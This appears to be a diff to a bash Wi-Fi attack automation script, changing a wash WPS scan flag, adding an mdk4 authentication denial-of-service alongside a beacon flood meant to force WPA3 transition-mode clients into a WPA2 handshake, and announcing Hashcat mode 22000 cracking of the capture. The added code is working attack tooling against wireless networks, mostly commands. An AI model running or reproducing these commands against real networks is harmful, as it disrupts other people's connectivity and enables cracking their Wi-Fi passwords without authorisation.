@@ -232,9 +232,8 @@ function network_scanner() {
     echo -e "\n\e[1;34mScanning for WPS-enabled networks with wash (20s)...\e[0m"
     local wash_json_output="$targets_path/Scan/wash_output.json"
     if command -v wash &>/dev/null; then
-        # Using -C for ignore FCS, as per original instruction. Man page for reaver's wash might show -F.
-        # If issues, this flag might need checking against `wash --help`.
-        sudo timeout 20s wash -i "${wifi_adapter}mon" -j -C > "$wash_json_output" 2>/dev/null
+        # Using -F for ignore FCS, as it's more standard for wash from reaver package.
+        sudo timeout 20s wash -i "${wifi_adapter}mon" -j -F > "$wash_json_output" 2>/dev/null
         if [ ! -s "$wash_json_output" ]; then # Check if file is empty (no WPS APs found) or not created (wash error)
             echo -e "\e[1;33mWash scan completed. No WPS networks found or wash produced no output.\e[0m"
             echo "[]" > "$wash_json_output" # Create an empty JSON array so jq doesn't fail
@@ -646,9 +645,18 @@ function devices_scanner() {
 # Router with Mixed Encryption
 # ------------------------------
 function mixed_encryption() {
-    echo -e "\033[1mThe encryption is "$encryption". \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\033[0m\n"
-    gnome-terminal --geometry=70x3-10000-10000 -- sudo timeout 95s mdk4 $wifi_adapter"mon" b -n $bssid_name_original -c $channel -w a
-    sleep 5
+    echo -e "\e[1mINFO: Network is WPA3/WPA2 Transition Mode ($encryption).\e[0m"
+    echo -e "    The script will attempt to disrupt clients and force a WPA2 handshake."
+    echo -e "    This involves beacon flooding and a brief authentication DoS."
+    echo -e "    Success is not guaranteed. If a WPA2 handshake is captured, it can be cracked.\n"
+
+    echo -e "    Starting beacon flood attack (mdk4 b)..."
+    gnome-terminal --geometry=70x3-10000-10000 -- sudo timeout 95s mdk4 "${wifi_adapter}mon" b -n "$bssid_name_original" -c "$channel" -w a
+    
+    echo -e "    Additionally attempting a brief Authentication DoS to disrupt clients (mdk4 a)..."
+    sudo timeout 10s mdk4 "${wifi_adapter}mon" a -a "$bssid_address" > /dev/null 2>&1
+    
+    sleep 5 # Keep the sleep to allow some time for effects before deauth
 }
 
 
@@ -1171,6 +1179,7 @@ function main_process() {
         elif grep -q -i "EAPOL" "$hcx_log_file"; then
             echo -e "    \e[1;32mINFO: EAPOL data identified in capture.\e[0m"
         fi
+        echo -e "    \e[1;32mINFO: The script will attempt to crack the captured data using Hashcat mode 22000.\e[0m"
     else
         echo -e "    \e[1;31mERROR: hcxpcapngtool command failed. See $hcx_log_file for details.\e[0m"
     fi
